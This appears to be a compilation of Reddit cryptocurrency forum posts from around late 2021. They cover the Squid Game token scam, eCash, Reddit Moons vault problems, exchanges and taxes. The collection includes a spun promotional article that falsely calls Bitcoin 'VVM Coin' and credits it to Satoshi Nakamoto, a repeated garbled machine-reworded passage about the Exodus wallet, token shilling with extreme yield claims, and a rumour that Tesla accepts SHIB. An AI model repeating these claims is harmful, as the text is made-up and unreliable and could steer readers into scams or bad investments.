2. Unable to sell unless 50% of hodlers agree to enable selling, in other words, We the scammers hold more than 50% \*evil laugh\* and wed vote against selling \*more evil laughs\* What even is this??? The scam message is so clear yet so many people fell for it and are now panicking. Whats worse is that there might be some who havent even realised selling isnt allowed and are still blindly contributing to the scam just because they liked the show. Im sure the scammers werent even expecting the scam to work this well but it did and it sure hurts to see.

3. Im totally against any form of regulations towards anything crypto-related but everyone has to start investing more diligently. A scam not only hurts innocent peoples wallets, but it also contributes to the scammers wallets. This would not only lead to more scams appearing as frequently as Rattata appearing on Pokemon FireRed and LeafGreen to take advantage of the unaware and vulnerable, but also brings a really really bad image to the crypto community as a whole. Im sure that this isnt something anybody other than the dinosaurs out there wish for.

4. Remember this, if youre just splashing cash into something just because some dude on the internet named something like JuicyAssInvestor or SafeandSmartInvestor then it is no different or even worse than betting on red at the roulette table just because oh I dont know blood is red in colour?

REMEMBER TO ALWAYS DO PROPER REASEARCH AND HERES TO MORE GREEN CANDLES TOWARDS THE END OF 2021! \*cheers\*

Amaury Schet is the guy behind it. He was one of the developers for the once successful Bitcoin cash project.

Amaury has now created ecash which is from a fork of bitcoin itself. Here's some information from their Faq's with a link below

What is eCash?

eCashis a cryptocurrency thats designed to be used as electronic cash. Just like the invention of emails made it possible to send direct messages online,eCashmakes it possible to send money directly to other people online. This includes being able to useeCashto pay for goods and services.

What can I use eCash for?

You can useeCashto send and receive payments without the need for a bank account. Its available in every country, and you can use it to send and receive cross-border payments anywhere in the world.

Where did eCash come from?

On November 15, 2020, the Bitcoin Cash (BCH) blockchain split into two chains. One of those chains was called BCHA for a time. This chain was what eventually becameeCash.

What is the supply of eCash?

eCashhas the same fixed supply as bitcoin. The default base unit ofeCashhas 2 decimal places (100 satoshis). The default base unit of bitcoin (BTC) has 8 decimal places (100,000,000 satoshis).

90% of all theeCashthat will ever exist has already been mined. The inflation rate foreCashis already low (less than 2% as of 2021), and will decrease to zero.

There's not another project I've come across what ecash is trying to succeed. They genuinely have the goal to make this a digital currency everyone can use. There's a great vision for the future and coins are a fraction of a cent

I know a guy who knows a guy who had some luck with an alt and is thinking about taking the gains. Its 4x a decent input and while not wife changing its decently life helping.

Let's say one was to sell out their bag, convert it all to a privacy token let's say for this example XMR. How would one then go about converting that to fiat and withdrawing to a personal bank account/fiat system? I am a NON US holder for the record.

Basically trying to implement as much privacy as possible here. 

Asking for a friend btw.

Coinbase website provides some interesting insight.

SHIB investors typically hold the token for just 10 days.

For reference,

XLM - 31 day

Bitcoin - 79 days

ADA - 68 days

MATIC - 73 days.

What does this mean? I dunno. I'm not a financial advisor. Just a stat.

When creating a vault there is an option to store the key in reddit, when you choose that option you have to setup a new password and doesn't get to see the recovery phrase. But how do you restore this vault than? There is no option to restore from reddit, all you get is an option to type the recovery phrase but this isn't shared when stored with reddit. I just saw so many posts where the users claimed that hadn't received a password recovery phrase and they only had a password but now are having trouble restoring the vault, can someone else confirm this? If this is true than this is a serious bug that needs to be addressed.

Update: So apparently when you store your vault with reddit on recovering there should be an option to recover using the vault password, but this is what I am not seeing, for somereason I am being asked to recover with the recovery phrase which I hadn't backedup as the vault was stored with reddit. When you store the vault with reddit it doesn't shows you the 12 words to write down and instead saves it with your account. Unfortunately this is not working as intended for me as I am unable to recover from the vault password.

&amp;#x200B;

EDIT: No, that's not my recovery phrase it's taken from the faqs page.

When the going gets tough, the tough get going. It will be a day to remember when we get the first divorce proceeding and they have to determine how the moons are split.

Thing about it, right now there is someone farming moons and doesnt realize they are going to lose it in a divorce one day.

She claims you farmed them on her laptop and internet. You claim time spent is where the value was determined.

You show the court your bestest shitpost. They laugh as its literally bitcoooonnnneeeccttt. You plead that is was basically a second side job or side gig.

All in all the court determines you didnt work hard by saying this is the way in every thread on /new/. The moons, therefore, are to be split.

Rough day.

If your new to crypto in here and you are confused as to what to buy or what to do dont fear we have all been there. 

Keep it simple, grab some BTC &amp; ETH and then do some more research into some good solid alt coin projects. 

Dont put all your eggs in one basket looking for the next moon coin chances are you will get burnt and miss out on some fantastic opportunities in the future. 

Always do your own research, dollar cost average and dont invest more than you can afford to lose. 

Take care legends

Hey guys, Im fairly new to all the crypto currency stuff. Ill try cut it short

I have 2 apps I use to invest in Crypto
1. Coinbase
2. Crypto.com

Im wanting to able to spend the crypto, not to get confused with selling the crypto. So Im looking into Wirex and the crypto.com cards? As they offer some sort of Visa card? Where you can use your Bitcoin to spend in the real world?

I was hoping for some guidance on this and the benefits from it? As well as how tax would work? 

Sorry if this is against the rules

People who got into crypto in 2017 and then didn't accumulate throughout the bear market... Why? Did you forget, lose confidence, or other? I feel like once you take the red pill and get into crypto and really understand wtf it's about, it's incredibly difficult to ever get "out" of Crypto unless you don't actually understand it (aka people who just buy shitcoins looking for a 100x and own no BTC or ETH)

So if you got into Crypto in 2013 or 2017 but didn't accumulate when it went down 90% or more, what happened?

# Why is cryptography so important, and why should I be concerned?

&amp;#x200B;

https://preview.redd.it/m3w9r7pxgxw71.jpg?width=760&amp;format=pjpg&amp;auto=webp&amp;s=bc1e9b98b7e585aec9695dac99bd5f7bd514e9b1

A few years ago, if you had mentioned the term cryptocurrency to me, I would have imagined some kind of currency involving an underworld banking system, with hooded traders sitting behind shady computers.

We now read about it not only in the business sections of daily websites or financial publications but on their front page. Entire sections of news publications are becoming devoted to things like[VVM Coin.](http://www.vvmcoin.io/)

Jurisdictions around the world are scurrying to put into place legislation and regulations to allow or make it easier for companies to carry out initial coin offerings (ICOs) or token issuances. Is cryptocurrency even the right terminology? Or should it be [digital currency](http://www.vvmcoin.io/)? [Virtual currency](http://www.vvmcoin.io/)?

So, the question which we must now ask ourselves: whatever we call it, do cryptocurrencies, really deserve this much attention. Should we care this much? What will the impact of crypto be in the long term?

So, the issue we must now ask ourselves is: do cryptocurrencies, whatever we call them, truly merit this much attention? Should we be so concerned? What will be the long-term impact of cryptocurrency?

**What exactly is it this time?**

In essence, cryptocurrency is totally decentralized, as are other blockchain-based services. It is not supervised by any central bank or monetary authority because it is a financial blockchain. Rather, a peer-to-peer community computer network made up of users' machines, or "nodes," keeps it running. The same logic applies if you are familiar with BitTorrent.

It is effectively a digital database  a "distributed public ledger"  that is run via cryptography using blockchain. VVM Coin and other cryptocurrencies are safe because they have been digitally validated through a process known as "mining." All information entering the VVM Coinblockchain is mathematically validated using an extremely complicated digital code built upon the network during mining. All new entries onto the ledger, as well as any changes to it, will be confirmed and verified by that [blockchain](http://www.vvmcoin.io/) network.

While it is fundamentally anonymous, the mathematics behind it transforms it into a global public transaction record, allowing every transaction to be traced via encryption.

**What makes it so crucial?**

&amp;#x200B;

https://preview.redd.it/tks1xvz4hxw71.jpg?width=1280&amp;format=pjpg&amp;auto=webp&amp;s=dbaa3748d6b84c59e77c9ed6c50c52aae4d69c4f

To begin, keep in mind that there are many different types of cryptocurrencies; for the purposes of this article, I'll focus on the most commonly referenced and used: VVM Coin (BTC) and Ether (ETH) are two digital currencies (ETH).

In 2008, an individual (or group, who knows) named Satoshi Nakamoto constructed the first blockchain - a financial blockchain. Its value has skyrocketed to absurd levels: you may have seen articles like "If I had brought $100 of VVM Coin back in 2010, I'd have almost US$100 million now" or "VVM Coin's First Billionaires" floating around the Internet. VVM Coin is being accepted as a form of payment by a growing number of businesses and online vendors.

Without going into too much detail, while Ethereum is extremely similar to VVM Coin, its applications expand beyond the financial realm of mining to include the provision of services on its own blockchain. Ethereum has built-in software programming languages that may be used to create smart contracts, which can be used for a variety of things, including the transfer and mining of Ether, the company's own tradeable digital asset (which is even more complex than VVM Coin).

Prior to Christmas 2017, the VVM Coin market saw a phenomenon known as "mooning"1. That is to say, their prices have skyrocketed to the point of absurdity.

It then jumped back up. Then, in mid-January, crypto exchanges crashed once more, with Ethereum values plummeting by about 25%.

So, there are the headlines. Regulatory agencies are issuing "buyer beware" warnings (certainly needed, but also because many central regulators struggle with the notion of regulating a decentralized technology). Investing in initial coin offers (ICOs) and cryptocurrencies is extremely risky, and you might potentially lose all of your money.

You certainly can. Of course, one could argue that Lehman Brothers' public stockholders did as well, but VVM Coin exchanges are undeniably more volatile than stock markets.

However, VVM Coin is significant, and it will not go away or be restricted to 100 years as some have speculated: transactions are rapid, digital, safe, and global, allowing for the maintenance of records without the risk of data piracy. Fraud is reduced to a minimum.

In addition, digital currencies such as VVM Coin should not cause inflation. Because the total number of VVM Coins that may ever be mined is limited to about 21 million, no central bank can ever increase the overall amount of cash in the system. VVM Coin is rare by nature... while one might argue that [cryptocurrencies](http://www.vvmcoin.io/) are endless in terms of how many may be created.

**Should I be concerned?**

&amp;#x200B;

https://preview.redd.it/m05yrkr5hxw71.jpg?width=900&amp;format=pjpg&amp;auto=webp&amp;s=f097f391879093f0ffcf9713beaa99b6afd52afa

Many prominent banks are increasingly investing in current crypto customers (JPMorgan with Zcash) or establishing their own cryptocurrency (such as Bank of America).

When people ask me, "Should I think about buying any cryptocurrency like VVM Coin or Ethereum?" I usually respond something like this \[and please note that I am not a financial advisor or in any position to give investment advice, so none of this should be taken as such\]. Do you, in essence, have any spare cash? Do you enjoy speculating in a relatively volatile investment (I say "reasonably" to be polite)? Have you gone to Las Vegas before? If that's the case, then welcome to the Crypto Casino.

As previously said, the cryptocurrency markets are now in a state of flux. While this is true, keep in mind that there are a number of the high-quality digital token and coin issuers outside of VVM Coin and Ethereum, with fantastic supporters and management, extremely robust AML procedures in place, a great business plan, and so on.



However, there is a slew of utterly bad ICOs taking place right now.

As a result, regulators must issue "buyer beware" warnings. Before you invest, you must conduct a thorough study.

Another important point to remember as cryptocurrencies become more widely used is that it is the decentralized ledger technology, [blockchain](http://www.vvmcoin.io/), that is gaining traction.

Blockchain is only a platform that allows cryptocurrencies and their digital tokens to function within it. Essentially, any transaction that can be recorded can benefit from the use of blockchain, whether it's medical records, immigration paperwork, birth certificates, or insurance plans.

Smart contracts, which are technologies that allow contracts to self-execute once certain criteria are satisfied and are based on the Ethereumblockchain, will soon make headlines as well.

Conclusion  
It's important to remember that crypto is a relatively new kind of cash, having only been around for about ten years. It's not gold, and it's not fiat money. This is a brand-new technology that has already demonstrated its power to completely upset the global financial system. However, it is far from ideal.

In terms of keeping your Crypto asset safe - I was wondering how safe is the Yubikey device compare to the Ledger Nano device. 
I mean,even though you keep your Crypto on the exchange when chosing to use the Yubikey,  both devices rquires you to physically connect it to the USB port of the computer in order to confirm transactions, are not they ? 
In case I'll get my computer/smartphone compromised and my Exchange account hacked, should I be worried about my coins being stolen even though I secured it with a Yubikey ?

Soft shilling here

Talking about stablecoin, there is a algorithmic rebasing token which changes supply according to market demand.

The protocol which controls the supply is soft pegged to 2019 $ value and will stay the same , which means if inflation eats the USD over time..it will still be of the same value ten years later down the road.

But there is one big problem, which is understanding how  the token works. People just jump in and whine later, since it's the first of its kind in the entire cryptoverse adoption is slow due to lack of understanding how it works.

DYOR

Token name " [AMPLEFORTH](https://www.ampleforth.org/)".

Check out the ampl lending on Aave , it's giving ridiculous  apy of 182k % . But first go through the white paper and background check the team members.

Do you know how these are picked?  It seems like they just choose (new?) coins an give away a few of them.  Some of them have dropped a lot since they were distributed.  Is there any reason to buy more of these?  Is coinbase giving them away because of promotions, or because they were paid to, or because they're trying to get rid of them?  Is there any reason to believe this coins will elevate in value compared to other coins?  I mean I"m basically just going to keep these endlessly but I'm visualizing what other people's thoughts are.

I found this report made by French parlement in 2018. " Technological challenges of blockchains''. I'll recap the introduction and try to translate the part i was looking for in the first place : Who is Satoshi.

I'm standing neutral but i know these guys (French parlement) have ressources because we pay them a load of money every year.

Report is huge in terms of volume, and I haven't read everything.

They mostly break down open door : 

 	\* explain the tech. / what could be use for.

	\* Problems (energy consumption, transparancy, guarantee for investor, distance with initial project, security)

	 \* Improvements ( ''The prospects opened up by blockchains are considerable and that is why their current technological and scientific limits must be identified, in order to encourage the search for the most relevant and sustainable solutions''). It's beautiful like ''du Rimbaud''.

But now the part I was doing my own research for. Who is Satoshi Nakamoto.

Translation mode activated : 

''Behind this pseudonym probably hides the collective of the founders of bitcoin and the first blockchain.

According to several experts met by your rapporteurs (\*those guys from French parlement), this is a multidisciplinary team of high-level cryptographers, several of whom are American \[11\].''

\*\*\*\*\*

Annotation

'' \[11\] : Satoshi Nakamoto has appointed Bitcoin Foundation Technical Director (CTO) Gavin Andresen as his successor. The operation of this cryptocurrency and the blockchain is described in a seminal article published on the internet in 2008: Bitcoin: A Peer to Peer Electronic Cash System, cf. the following link: [https://bitcoin.org/bitcoin.pdf](https://bitcoin.org/bitcoin.pdf) ''

&amp;#x200B;

Link to original French parlement text : [https://www.assemblee-nationale.fr/dyn/opendata/RAPPANR5L15B1092.html#\_ftn11](https://www.assemblee-nationale.fr/dyn/opendata/RAPPANR5L15B1092.html#_ftn11)

&amp;#x200B;

I would glady accept any improvement in translation and correction of grammatical mistake, modifying the post accordingly.

At this point many of us have invested 5, 10, 25, 50, 75%  into crypto. Some  are balls deep 100% in crypto leaving the stock market. Some pulling their 401ks others dropping monthly earnings that used to be become 0% bank savings into their crypto of choice. So where do you stand? Are you about that life? The crypto life?

Are you ready to embrace satoshis vision? Become bankless? Hold your private keys? Be your own bank? Never depend on tradfi for whatever favor you thought they were doing for your? What is your level of crypto life? How far do you want to go? 

This isn't meant to argue tradfi vs defi. You probably already know your path. Maybe you are trying to figure it out. Maybe you are just waiting for a percentage earning to cash out. I want to hear from people who have or want to make crypto their life. Are you about that life? I am. I hope you are too.

Something as hilarious and invigorating as the GME bonanza late last year and early this year? Before the congressional inquiry and the conspiracies and all sorts of stuff there was a lot of comedy mixed with some education. Many, many people got their first taste of the financial world. 

As we know from almost all tech booms, network effects are THE THING. It seems like the energy of millions of people are about to be knocking on the door, many of whom are already acquainted with cryptocurrencies.

I heard that GME was gonna be building NFTs on top of LRC (ETH layer 2 solution). That combination seems to me like a beautiful recipe. What do you think?


Looking forward to  not gonna lie.

So I had just posted on here about how when you store you vault with reddit it doesn't shows you the private keys. Instead just asks you to create a password for the vault. But when you go to restore the wallet you are required to then give the private key even though you had saved the vault with your reddit account.

Link to previous post: [https://www.reddit.com/r/CryptoCurrency/comments/qk6r7j/is\_this\_a\_bug\_in\_reddit\_moons\_cant\_restore\_if/](https://www.reddit.com/r/CryptoCurrency/comments/qk6r7j/is_this_a_bug_in_reddit_moons_cant_restore_if/)

Now when I looked up the public address of this account : [https://rinkeby.etherscan.io/address/0xeb544ccf027939c5ffdeae5a4562d4db1ecdc2cc#tokentxns](https://rinkeby.etherscan.io/address/0xeb544ccf027939c5ffdeae5a4562d4db1ecdc2cc#tokentxns) 

As you can see the moons have been transfered out around 100 days ago, it wasn't me, but how are they then still visible on my account than? Can anyone please help me with this? Also, kindly upvote for visibility.

did anyone else get in on that 100$ of BTC for putting 100$ in best promo ever! not trying to shill but the idea of a brokerage is genius the no fees is so much better then coinbase and assets are always cheaper. granted i only been on it for 48hrs now. not trying to shill but its a great idea that actually works. they push their token a little bit to much but if thats the only downside ill take that over coinbase or binance any day. also they are publicly traded and cheap compared to their competitors.

I've been going through the internet for the types of Crypto exchanges. For a complete noob it doesn't matter, but it sure is better to know the nuances and the options you can get in this space. 

So, here is what I found...

1. **Centralized exchanges** :- 

     As suggested by the name, centralized cryptocurrency exchanges act as a third-party between a buyer and a seller. Approximately all of the crypto transactions go through centralized exchanges since they offer more reliability. Coinbase, Binance,Kraken and Gemini are some of the examples of centralized cryptocurrency exchanges.
     There are sub categories in these as well. 

      **Retailers**:-
          Generally, retail exchanges stand out by their intuitive interfaces. Even a person without any former experience is likely to understand where all the required elements are placed. Also, they often provide their own wallets so that there would be fewer issues with transactions. Please note that it is not recommended to store your funds on exchanges. 

       **Derivatives**:-
          Working with derivatives is something for advanced cryptocurrency users because it requires more investment knowledge. Yes, you can trade crypto like futures or options.

        **Aggregating exchanges**:-
            Aggregating exchanges are basically exchange simulators, which doesn't hold any actual coins, but actually is a platform to trade on prices. (IMO these are just mass market driving tools, which actually doesn't invoke the real Crypto spirit.) 

2. **Decentralised exchanges**:-
        It is a non-custodial exchange that does not handle any funds on its own. Instead, the service uses special networks and similar software to automatically send money in order to provide wallet-to-wallet trading. Some examples include sushiswap, uniswap. 

3. **Peer to peer (P2P)**:-
        Peer-to-peer exchanges act as a bridge connecting two individual traders. Usually, either a specific percent or a fixed sum is charged per each trade for the services of the website.P2P exchanges are often used as mediators to make sure none of the parties get cheated. Escrow system is usually used as a safety net. 


I'm still unsure if P2P should come under centralized as it involves a third party or it itself is a seperate category. Hope this information will be useful. Do comment to point out any mistakes or any inconsistencies.

I started trading cryptos when i was 15, i am almost 17 now. it seemed like fun and also a good way to make some money, so instead of asking my parents for pocketmoney i asked them to put it into my Binance wallet instead. I faced alot of losses in the beginning but i kind of expected it cause i was new, I eventually made all of that money back as well. It was all going well but idk if it was a my greed or curiosity I wanted to get into futures trading even tho i knew it was risky and i could lose all my money. I did a little bit of research and my dumbass was like this looks easy and i can make alot of money. My first few trades were a success but long story short i ended up getting liquidated and now my wallet is completely empty so I cant trade. However, i will still continue to study the market and start investing again when i have a proper source of income.

When the El Salvador government decided to allow Bitcoin to it's residents they gave them 30$ in a wallet they created to encourage citizens to open an account. And surprise surprise that 30$ has been stolen from people when they attempted to activate the wallet. Imagine being poor and given 30$ only to have it stolen before you got it, SMH....

Hello,
I was wondering if you guys would have any advices regarding projects and ecosystems in blockchain that we could invest starting today, as a part of long term strategy. As sexy as moon shots look and feel like, I do wish to be part of something that can take the tech forward. Should I just keep paying my attention to the established players like Bitcoin, Ethereum, Cardano, and Polkadot, or are there are others that has the potential to grow more with age?
Advance thanks to everyone who takes the time to comment and share their thoughts/suggestions.

I can imagine how frustrating it must be to watch all these new people flood into your space, into a world you've been working hard in and building, some of you for years.  

Over and over I keep seeing comments and posts deriding the people investing in meme coins, not reading whitepapers, getting scammed, making mistakes. They get called greedy, stupid. There is so much resentment. And then, when someone who is new to crypto comes here and asks a beginner question, they get these vague or sarcastic answers. So how do you expect them to learn?  

I was lured into this crypto stuff myself due to the meme coin that blew up the last couple of weeks. I've spent pretty much 14 hours a day since then reading, learning, googling, absorbing info. There is SO MUCH to learn and it's not accessible or easy! The only reason I've even had the luxury of all that time is that I'm on a disability pension and don't have a 9-5 job to go to.  

If what I've picked up is correct, it will benefit all of you to have crypto become adopted by more people, to become more mainstream. So maybe think about making it a more welcoming space, or teaching those who know less than you. People aren't greedy and stupid - they're overworked, underpaid, aware that the system is rigged against them, and looking for a way out.

Hello everybody! I am new to the crypto fam, and really need some guidance. Ive got 5,000 $ to invest, how should i go about it? Should i buy loads of cheap coins and pray that one will take off, or invest in established coins (a bit of btc, a bit of eth, etc.), or some NFTs? I have absolutely no background in trading or crypto but am interested in crypto and want to start, but am really confused as to where to get the proper research, which coins to invest in and how. I downloaded metamask, what else is needed? 



Your advice is highly needed thank you!!!

My usual platform is Voyager, but Plaid currently isnt functioning with Capital One. Thanks to that, I cannot fund my account anymore. 

Im looking for another platform with the intent to HODL BTC and/or ETH. I currently have access to Coinbase Pro, Crypto.com and Webull. 

Id love to hear your guys preference of the three in terms of safety, fees, funding speed and possible staking options. Also, when are the fees implemented? Buying? Selling? Both? Neither?

If you feel strongly about a different platform for my plans, Im all ears.

Thanks

I know people are going to say [EverGrow](https://evergrowcoin.com/) is a scam, etc but looking for some more nuanced thoughts than that.

There was an [AMA](https://youtu.be/R3SBetGIiR0?t=1688) with Sam Kelly (Chairman of the Board) and he appears to be saying all the right things and having invested a decent amount (which I can still afford to lose) I've had great returns in just a week (including reflections).

However... Sam Kelly's Twitter doesn't mention anything about Evergrow. He also appears to have deleted a [couple of tweets](https://imgur.com/a/2rVsOoo) in early September regarding Evergrow.

Like I say I've invested in EGC and I genuinely hope it's legit but when things are going this well (so far) it seems too good to be true. What are your thoughts? Should I take my profits and run?

Are there any similar projects in the past that have had this kind of momentum only for it be a rugpull/fail?

I've had to change my wording as the bit seems bot to like it 

There is a coin ( SG)  that now has a market cap of $30 billion and trading volume of $6 million but literally doesn't do anything but in rich the creator 

It is the most obvious thing I've ever seen in 15 years and honestly the funniest this year 

You can only buy and bit sell and the name literally is based off a show where people die to make one winner money 

Websites are putting up warnings that it's a trap and the price can only go up as you can't sell. You are just donating to the Devs white powder and women of low morality party 

If you are on this sub; Congratulations!!

You have won the shitcoin Olympics 

The FOMO is so bad people are buying a coin they can't use, trade or sell

For all you meme coin fanboys and girls, hearing shib and Doge being accepted by tesla must be music to your ears. You probably are all praising Elon and worshipping him right now. Well in case you dont realise, this same Elon is the one who is fighting against paying his fair share of taxes. 

This dude is so fucking rich, he doesnt gives two shits about cryptocurrency, let alone meme coins. Hes just playing whatever cards he can get his hands on to gain supporters. Obviously still trying to ride his glory days of tweeting about Doge 

Dont lose sight of the real world issues please. I get it that we all want to be rich

That being said, if u guys like shib on its own, good on you. But dont go praising this man

How many people treat crypto like a pay to win video game? 

I had been playing video games for over 10 years and spent so much money on them that when I quit, it becomes worthless until I started crypto. I used to put money into those games weekly like what Im doing now for weekly DCA. The biggest difference now is that I have a chance to make money instead of wasting it for hour and hours of fun and end up with nothing. 

I spend hours a day looking at charts and reading up on different projects now instead. Seems like Im still occupying the same amount of time each day staring at my phone screen. 

The switch over from spending money in pay to win games to crypto is so much more healthier to my finances. I wish I started on crypto back then. BTC was like a few dollars then too. 

How many of you guys used to spend money on pay to win video games instead of investing it on crypto?

I'm in this for the long run and I think this whole ecosystem is interesting; technologically, financially and economically wise. Sometimes I do thought experiments to visualize what the future might look like. To give an example, here are a few of my (sometimes bold) predictions:

* 50% of the world population will own some form of cryptocurrency
* 90% of the countries in the world will have included cryptocurrency in their law system one way or another
* We will fully be in the 'early majority' adoption phase
* Bitcoin will be $300.000
* Dogecoin will be $3
* Ethereum will be #1 in total marketcap
* Privacy coins will be removed from (more) exchanges, but rise sharply in value
* 50% of Fortune 500 companies will accept cryptocurrency payments

OK I am totally mystified about this.

Apparently, I just made $900 taxable on a crypto to crypto trade.  I traded a bunch of Tezos, which I was losing $ on, I was down on it, for some SOL.  And I am being taxed on a $900 GAIN?  There was no f\*\*\*\*\*g gain.. I didn't make any money, my portfolio balance didn't increase... wtf is going on here?  I'm probably just confused but I don't get this AT ALL.

Do any of you know of a DETAILED explanation of EXACTLY how this works? I need to know exactly how these gains are calculated so I can consider them BEFORE I do any more crypto-to-crypto trading.  And preferably this explanation would be written in a way that someone of average intelligence could understand?  I can't find anything on the web..   Thanks in advance for any help!

Similar to alt season, I would say that meme coins have their own season. And it's even more apparent when shit ton of Memecoins pump while BTC and Alt coins remain stagnant.

This new "breed" of investors who trade on emotions are so unpredictable and inexperienced that they would throw money at anything, even coins that can't be sold.

I think we can all agree that the Meme season really do exist and the sooner we embrace it the better understanding we have of the constantly evolving crypto market.

Basenji is a reflection based token with a suite of decentralized applications under active development designed to encapsulate and utilize the vast quantities of dog tokens in the cryptocurrency ecosystem. We are going to introduce our essential, crosschain DeFi application called Dogepark, that will allow users to breed (stake) their existing dog coins/tokens to create exciting new breeds of dogs (LP tokens). The first pioneers to create new breeds of a dog on the platform will receive an NFT to immortalize their new breed on the blockchain.

The entire Basenji team is excited to undertake this journey with you all and we can't wait to meet all your new pets.

Tokenomics:

- 4% fee auto added to liquidity pool.
- 2% fee auto distributed to all holders.
- 40% of Basenji supply is burned from the beginning.

Its no secret that eth gas fees are absolutely insane, and until 2.0 comes out, and possibly even after, the ecosystem is pretty messed up by saturation. Why do people keep making new ERC-20 tokens when they could make them on any other ecosystem, such as DOT, Algo, SOL, etc.

&amp;#x200B;

So theres a 500 character limit to avoid spam and I guess right here I will put some discussion points or investments.

My Portfolio: 66% ETH,12% ALGO, 2% tezos, 4% ADA, 2.5% floki inu, 2.5% kishu inu, 5% LINK,5% MATIC, 1% BTC

something like this. I know most of you guys frown on shitcoins but its money that can be lost, and the gain potential for shitcoins right now is for some reason huge. It seems hypocritical for me to make a post about useability of ecosystems yet have a not insignificant amount of my portfolio invested into dog coins, but i guess it is what it is. Anyway, the original question stands, and it is slightly frustrating to try to invest into something in the ETH ecosystem when gas fees for swaps are consistently above $80 and always above 60$. Even BTC has way lower gas fees.

It seems Squid game coin is actually a scheme that seems to sucks users money in but its almost impossible to get it out. A crypto black hole, of sorts

But if any of the investors into this actually bothered to read the white paper, the mechanics of the whole thing will become clear, or at the very least it will be clear that its not just numbers go up, everyone profit.. but instead, there are game mechanics to the whole thing. 

[Squid game token uses Marbles as an anti-dumping mechanism. Only Marble holders can trade Squid, and to obtain Marbles you need to play the game. ](https://preview.redd.it/kyj0604i3xw71.jpg?width=1444&amp;format=pjpg&amp;auto=webp&amp;s=59d0332adf8de322188a008e59aa25829e7fcdd6)

The crayon eating crypto "investor" has been aping into this just because of the TV show's popularity, and seeing the number go up (Price has gone gone from 8c to $30 now) on the coin, more and more people have put their money into it.. and now they cant get it out. 

This is why one must do the bare minimum research before investing in something. 

[This guy who is complaining that he lost all his money on SQUID clearly never bothered to look into the whitepaper and mechanics ](https://preview.redd.it/jcreqkt24xw71.jpg?width=1774&amp;format=pjpg&amp;auto=webp&amp;s=573d80bdc482639f27d95f5cafdf42ff0abd33fe)

Imminent Bitcoin Upgrade Is One for the Ages.

Bitcoin (BTC) update coming in November Taproot  which is comprised of three Bitcoin Improvement Proposals (BIPs)  will revamp multiple aspects of the worlds biggest crypto by market cap.

Taproot substantially improves user privacy, network scalability, and the fungibility of all Bitcoins. Users will enjoy cheaper transaction fees and the ability to conduct multisig (multi-signature) transactions and create complex smart contracts with the same efficiency, low fees and privacy as single-sig transactions. Taproot is arguably the most significant Bitcoin upgrade to date, setting the stage for massive innovation and adoption.

Taproots enhanced user privacy and transaction efficiency benefits are two sides of the same coin. The upgrade means that details about a users unexecuted spending conditions are not revealed, resulting in improved privacy when transacting on the network and a lighter data load on the blockchain.

November promises to be big month for Bitcoin!

Sorry for posting it here. Reason being I have to be a trusted member of the Gate Io subreddit before I'm allowed to post. So how the fuck do I become one, can't access their wiki, their rules has no explanation on it omg. 

Created Gate account for their quick listing of various new coins. 

So I just created an account, pending 1st Kyc.

However, I noticed 2 things. 

First, in the markets page, it only shows a limited number of coins, typically the popular ones. How do I set it to show all?

Secondly, my favorites are not saved or shown? As a test, I search for Trx in the Spot trading page and nothing appears. Have to Click on direct link from CMC which brings me to Gateio Trx spot trading page. Starred it and it still doesn't show in any of my favourites, tf?

So today was the first crypto conversation I've had with a complete stranger. Have you all had many "encounters" with other crypto fans/holders. If so how did it go? What did you take away from conversation?

I want to hear from you but this is what I took away from it:

1. We are all way more similar then we think. The way he was talking at some points in the conversation was eerily similar to what i think/obsess on/say.

2. He knew a bit about crypto, but was still a little delusional on possible future gains.

3. We may be years away from "mainstream adoption" but we are definitely in the middle of mainstream knowledge. Be it Doge, Shiba, BTC or ETH people are aware and talking about Crypto.

Hi, 

I have transferred more than 1000 XRP from Coin DCX (Indian exchange) to Binance. The amount had been debited and transaction marked as successful on CoinDCX but it's been more than 72 hours and the amount has not been credited to my Binance wallet.
I tracked the TxID but Block explorer says "Transaction not found", so does Binance. I went back to the Indian exchange and they've closed the ticket, asking me to contact binance but obviously the transaction didn't get through. 

Can anyone please advise me on how to deal with this, I have raised the ticket again, tweeted founders etc. but am very worried that they'll come back with a standard response of "we can't do anything, check with Binance". 

Is there anything I can do to resolve this? This is equivalent to my 2 months salary and I'm losing my cool, I'll really appreciate any guidance here. I did try the transaction with a minor amount just before the major transfer and it was successful. Let me know if any extra info. is needed.

TIA

Looks like Tesla is planning to accept SHIBA tokens... check it for yourself, look for SHIBA inside that file. Why would Tesla prepare to accept SHIBA, this is real, it can't be fake... This is unbelievable, everybody thinking about DOGE, but SHIB is the real deal! There is also bitcoin right there, so they are likely planning to accept BTC again...

When creating a vault there is an option to store the key in reddit, when you choose that option you have to setup a new password and doesn't get to see the recovery phrase. But how do you restore this vault than? There is no option to restore from reddit, all you get is an option to type the recovery phrase but this isn't shared when stored with reddit. I just saw so many posts where the users claimed that hadn't received a password recovery phrase and they only had a password but now are having trouble restoring the vault, can someone else confirm this? If this is true than this is a serious bug that needs to be addressed.

The first is to utilize a standard 12-word passphrase. This is given to you when you first make a record. It's vital that you store this passphrase safely. Record it and put it in a protected store box. If you lose it and your PC breaks, you will not have the option to get to your cryptocurrency. One of the biggest reactions against Exodus wallet from clients is the absence of incorporation with conventional two-factor verification techniques like Google Authenticator or Authy. There are two reasons that Exodus selects not to offer help for provisions, for example, email reinforcements or 2-factor validation. One reason is because of potential security breaks and hacks of a client's email, Exodus needed to restrict dependence on the security of outsider applications. The other explanation is that Exodus, regardless of anything else, has faith in the protection and non-custodial privileges of their clients, as they put stock in their networks' on the whole correct to security and decentralization. Mass migration the organization, doesn't gather any close to home data in the interest of their clients and accordingly, email reinforcements are not upheld and all together for two-factor confirmation to work, the organization needs to store a data set of client accounts on their servers. Since the Exodus wallet makes, scrambles and stores all of the client's data on their nearby gadget, adding the help of customary two-factor authenticator strategies was not a conceivable option to the wallet's security.

One of the biggest reactions against Exodus wallet from clients is the absence of incorporation with conventional two-factor verification techniques like Google Authenticator or Authy. There are two reasons that Exodus selects not to offer help for provisions, for example, email reinforcements or 2-factor validation. One reason is because of potential security breaks and hacks of a client's email, Exodus needed to restrict dependence on the security of outsider applications. The other explanation is that Exodus, regardless of anything else, has faith in the protection and non-custodial privileges of their clients, as they put stock in their networks' on the whole correct to security and decentralization. Mass migration the organization, doesn't gather any close to home data in the interest of their clients and accordingly, email reinforcements are not upheld and all together for two-factor confirmation to work, the organization needs to store a data set of client accounts on their servers. Since the Exodus wallet makes, scrambles and stores all of the client's data on their nearby gadget, adding the help of customary two-factor authenticator strategies was not a conceivable option to the wallet's security.

